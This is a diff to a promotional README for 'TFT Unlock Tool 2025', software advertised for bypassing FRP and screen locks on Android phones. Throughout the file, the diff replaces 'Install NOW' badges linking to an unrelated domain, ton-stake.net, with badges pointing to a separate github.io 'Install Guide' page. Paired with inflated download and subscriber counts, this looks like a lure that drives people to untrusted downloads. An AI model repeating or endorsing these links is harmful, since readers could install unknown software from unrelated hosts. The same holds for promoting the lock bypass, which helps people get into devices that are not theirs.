@@ -4,7 +4,9 @@
 
 **Description**: Regain access to your Android devices with **TFT Unlock Tool 2025**! This repository provides comprehensive tutorials, guides, and resources for using TFT Unlock Tool to bypass FRP locks, screen locks, and repair software issues on devices like Samsung, Xiaomi, Huawei, and more. With support for 100+ Android models across Qualcomm, MediaTek, and UNISOC chipsets, join our community with 50K+ downloads and 30K+ subscribers to master device unlocking in 2025!  
 
-[![Install TFT Unlock Tool](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://tft-unlock-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -32,10 +34,11 @@ Begin your unlocking journey with TFT Unlock Tool 2025 using these simple steps!
 6. **Troubleshooting** ❓  
    If issues occur, disable your VPN, check your internet, or try browsers like Chrome, Firefox, or Edge.  
 
-[![Install TFT Unlock Tool](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://tft-unlock-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
-
+ 
 ## 💡 Why Choose TFT Unlock Tool 2025  
 
 - 🔓 **Effortless Unlocking**: Bypass FRP, screen locks, and more on Android devices.  
@@ -45,9 +48,11 @@ Begin your unlocking journey with TFT Unlock Tool 2025 using these simple steps!
 - 🌍 **Active Community**: Backed by 50K+ downloads and 30K+ subscribers.  
 - 📅 **2025 Updates**: Stay current with the latest unlocking features.  
 
-[![Install TFT Unlock Tool](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://tft-unlock-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
+ 
 
 ## 🎯 Usage Scenarios  
 
@@ -62,10 +67,6 @@ Begin your unlocking journey with TFT Unlock Tool 2025 using these simple steps!
 - 📱 **Screen Lock Removal**: Unlock PINs, patterns, or biometric locks.  
 - 🛠 **Device Repair**: Fix IMEI issues or flash firmware for recovery.  
 - 📚 **Skill Building**: Learn advanced unlocking techniques from 30K+ subscribers.  
-
-[![Install TFT Unlock Tool](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
 
 ## 🏆 Benefits  
 
